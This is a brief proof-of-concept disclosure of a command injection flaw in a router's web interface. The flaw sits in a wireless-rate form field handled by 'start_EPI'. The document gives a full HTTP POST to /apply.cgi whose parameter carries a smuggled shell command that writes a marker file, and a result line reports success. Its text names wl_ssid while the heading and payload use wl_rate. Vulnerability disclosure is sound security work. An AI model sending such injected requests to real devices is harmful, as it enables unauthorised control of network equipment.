# wl_rate

in function `start_EPI`, we can inject `wl_ssid` to do anything

# PoC
plz replace the session

```http
POST /apply.cgi;session_id=ee76bb45012c149b26e22fa0037333fa HTTP/1.1
Host: 192.168.1.1
Content-Length: 137
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.1.1
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.1/SingleForward.asp;session_id=ee76bb45012c149b26e22fa0037333fa
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

need_reboot=1&commit=1&need_action=1&nvset_cgi=1&StartEPI=1&wl_rate=%3Becho%20%22hacker_payload_wl_rate%22%20%3E%20%2Ftmp%2Fc10uds%3B%23s
```



# result
I successfully touch a file with the content "hacker_payload_wl_rate"
![alt text](imgs/image.png)
